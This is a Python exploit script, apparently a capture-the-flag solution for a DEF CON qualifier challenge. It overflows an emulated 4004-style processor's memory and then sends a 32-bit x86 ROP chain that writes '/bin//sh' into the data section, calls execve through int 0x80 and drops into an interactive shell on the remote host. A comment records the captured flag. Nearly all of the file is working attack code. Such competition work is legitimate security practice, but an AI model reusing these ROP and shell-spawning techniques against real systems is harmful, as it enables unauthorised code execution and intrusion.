from pwnlib import *


# The flag is: Bytes ain't shit but nibbles and bits
 

#s = Socket(("localhost", 6767))
s = Socket(("faggin_4f17fb81148f7c476f9b4fa2230ac11e.quals.shallweplayaga.me", 4004))

raw_input("> ")


def SRC(n):
	assert n == (n & 0xff)
	code  = ""
	# put high values (0xf, 0xf) into two registers (r0, r1)
	code += chr(0b00100000) + chr(n)
	# use SRC to set the register control from the register pair
	code += chr(0b00100001)
	return code

def convert_offset(offset, upper_nibble):
	if offset >= 480:
		status_regs = 3
		offset -= 480
	elif offset >= 320:
		status_regs = 2
		offset -= 320
	elif offset >= 160:
		status_regs = 1
		offset -= 160
	else:
		status_regs = 0
	
	n_40s = offset / 40
	result = (n_40s << 6)
	offset -= n_40s * 40

	n_10s = offset / 10
	result |= (n_10s << 4)
	offset -= n_10s * 10

	result |= (offset*2)
	result |= upper_nibble

	return (result, status_regs)



def clear_accumulator():
	return chr(0b11110000)

def inc_accumulator():
	return chr(0b11110010)

def set_accumulator(n):
	return clear_accumulator() + inc_accumulator()*n


def set_ram_bank(n):
	return set_accumulator(n) + chr(0b11111101)



def write_byte(b, offset):
	
	code  = ""

	n, ram_bank = convert_offset(offset, 0)
	code += SRC(n) + set_ram_bank(ram_bank)
	code += set_accumulator(b & 0xf)
	code += chr(0b11100000) # use WRM to write into selected place

	n, ram_bank = convert_offset(offset, 1)
	code += SRC(n) + set_ram_bank(ram_bank)
	code += set_accumulator(b >> 4)
	code += chr(0b11100000) # use WRM to write into selected place

	return code


def write_word(w, offset):
	result = ""
	for i, b in enumerate(pd(w)):
		result += write_byte(ord(b), offset + i)
	return result



payload  = "" # pd(0xdeadbeef)


def write(dest, word):
	p = ""
	p += pack('<I', 0x080725aa) # pop edx ; ret
	p += pack('<I', dest) # @ .data
	p += pack('<I', 0x080bedf6) # pop eax ; ret
	p += pd(word)
	p += pack('<I', 0x080572eb) # mov dword ptr [edx], eax ; ret
	return p

from struct import pack
p = ""



p += write(0x080f3080, 0x080f3060)
p += write(0x080f3084, 0)


p += pack('<I', 0x080725aa) # pop edx ; ret
p += pack('<I', 0x080f3060) # @ .data
p += pack('<I', 0x080bedf6) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x080572eb) # mov dword ptr [edx], eax ; ret


p += pack('<I', 0x080725aa) # pop edx ; ret
p += pack('<I', 0x080f3064) # @ .data + 4
p += pack('<I', 0x080bedf6) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x080572eb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080725aa) # pop edx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x0804b783) # xor eax, eax ; ret
p += pack('<I', 0x080572eb) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481d1) # pop ebx ; ret
p += pack('<I', 0x080f3060) # @ .data
p += pack('<I', 0x080e7275) # pop ecx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x080725aa) # pop edx ; ret
p += pack('<I', 0x080f3068) # @ .data + 8
p += pack('<I', 0x0804b783) # xor eax, eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret
p += pack('<I', 0x0808126f) # inc eax ; ret

p += pack('<I', 0x080725aa) # pop edx ; ret
p += pack("<I", 0)

p += pack('<I', 0x080e7275) # pop ecx ; ret
p += pack("<I", 0x080f3080)

p += pack('<I', 0x0804fda5) # int 0x80

payload += p





code  = ""
code += write_word(0x080a51bb, 0x15f)
code += "\x00" # NOP 
code += "A"*0x215
code += payload
code += pattern(2048 - len(code))
assert len(code) == 2048

s.send(code)


s.interact()
